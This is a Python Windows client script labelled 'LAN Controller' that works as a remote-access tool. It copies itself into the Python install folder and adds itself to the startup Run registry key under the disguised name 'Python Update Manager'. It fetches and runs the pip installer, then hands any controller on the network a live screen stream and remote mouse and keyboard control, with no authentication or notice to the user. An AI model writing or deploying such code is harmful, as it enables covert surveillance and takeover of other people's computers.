#LAN Controller by obwan02
#Client

import os, json, ctypes, winreg, time, ctypes,  shutil, subprocess, sys, pickle

import socket as s
import ctypes.wintypes as wintypes
from urllib.request import urlretrieve
from threading import Thread

def call(command):
    subprocess.call(command, creationflags=0x08000000)

'''
- Add Python to Path
Pre-Installations:
    -Install pip
    -Install pillow (then restart)
    
Then it adds its self to 
startup using winreg.
'''

#Add self to startup
possible = False
if (not os.path.exists(r'C:\Python33\dlls\client.py')) ^ (not os.path.exists('C:\\Python33')):
    print('Adding to startup\nCopying to install dir')
    possible = True
    try:
        shutil.copy(__file__, r'C:\Python33\dlls\client.py')
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(k, 'Python Update Manager', 0, winreg.REG_SZ, r'C:\Python33\dlls\client.py')
    except PermissionError:
        print('Unable to add self to startup')

if os.environ['PATH'].lower().find('python') == -1:
    call("setx path \"%PATH%;C:\\Python33\\\"")
    print('Added python to path')

print(os.path.abspath(r'C:\Python33\dlls\client.py'))
print(os.path.abspath(__file__))
if (os.path.abspath(__file__) != os.path.abspath(r'C:\Python33\dlls\client.py')) and possible:
    print('Restarting client from install dir')
    os.execl(sys.executable, 'python', r'C:\Python33\dlls\client.py', *sys.argv[1:])

try:
    from PIL.ImageGrab import grab
    import PIL.Image as Image
except ImportError:
    urlretrieve('https://bootstrap.pypa.io/get-pip.py', 'temp.py')
    print('Retrieved pip')
    call('python ./temp.py')
    print('Installed pip')
    call('python -m pip install pillow -t ' + os.path.dirname(__file__))
    print('Installed pillow\nRestarting')
    os.execl(sys.executable, 'python', __file__, *sys.argv[1:])





IP = s.gethostbyname(os.environ['COMPUTERNAME'])

GLOBAL_PORT = 5555
PORT = 4567
STREAM_PORT = 6555

WIDTH = ctypes.windll.user32.GetSystemMetrics(0)
HEIGHT = ctypes.windll.user32.GetSystemMetrics(1)

class Command:

    @staticmethod
    def parse(msg):
        jsonData = json.loads(msg)
        command = jsonData['command']
        data = jsonData['data']

        return Command(command, data)
    
    def __init__(self, command, data):
        assert type(command) == str
        assert type(data) == dict

        assert command in Command.commands
        
        self.command = command
        self.data = data

    def getJSON(self):
        jsonData = {
            'command' : self.command,
            'data' : self.data
            }
        
        return json.dumps(jsonData)

    def run(self):
        Command.commands[self.command](self.data)

Command.commands = {'MOUSE' : lambda a: mouseEventCommand(a), 'KEYBOARD' : lambda a: keyboardCommand(a)}

def mouseEventCommand(data):
    #Convert x and  y from 1024x768 to actual resolution
    x = (data['dx'] / 1024) * WIDTH
    y = (data['dy'] / 768) * HEIGHT
    ctypes.windll.user32.SetCursorPos(x, y)
    ctypes.windll.user32.mouse_event(data['flags'], data['dx'], data['dy'], data['dwData'], 0)
    

def keyboardCommand(data):
    ctypes.windll.user32.keybd_event(data['bVk'], data['bScan'], data['dwFlags'], 0)
    pass
class StreamHandler:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.reset = False
        self.frames = []

        self.sock = s.socket(s.AF_INET, s.SOCK_STREAM)
        self.sock.connect((ip, port))

        self.thread = Thread(target=self.sendThread)
        self.thread.start()

    def sendThread(self):
        while True:
            img = grab((0, 0, WIDTH, HEIGHT))
            img = img.resize((1024, 768))
            data = pickle.dumps(img)
            self.send(data)

    def send(self, data):
        length = len(data)
        i = 0
        data += b'END!'
        while i < length:
            try:
                i += self.sock.send(data[i:])
            except ConnectionResetError:
                return
        return i
        

class ControllerHandler:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.reset = False
        self.sock = s.socket(s.AF_INET, s.SOCK_STREAM)
        self.sock.connect((ip, port))

    def onMessageRecv(self, msg):
        msg = msg.decode('utf-8')
        command = Command.parse(msg)
        command.run()


    def listen(self):

        lengthBytes = None
        try:
            lengthBytes = self.sock.recv(2)
        except ConnectionResetError:
            self.reset = True
            return
        length = int.from_bytes(lengthBytes, 'little')

        msg = None
        try:
            msg = self.sock.recv(length)
        except ConnectionResetError:
            self.reset = True
            return
        self.onMessageRecv(msg)
        

        
        
def listenForController():
    globalListen = s.socket(s.AF_INET, s.SOCK_DGRAM)
    globalListen.bind(('', GLOBAL_PORT))
    print('Listening for controller connection')
    msg, cpu = globalListen.recvfrom(1024)
    globalListen.close()

    return cpu[0]
#For each connection session
while True:
    ip = listenForController()
    print('Controller Handler Recieved')
    print('Connected to ' + ip)
    handler = ControllerHandler(ip, PORT)
    streamer = StreamHandler(ip, STREAM_PORT)
    print('Listening for commands')


    while True:       
        handler.listen()
        if handler.reset: break
    print('Reseting Connection')
    print('Disconnected from ' + ip)
    handler.reset = False
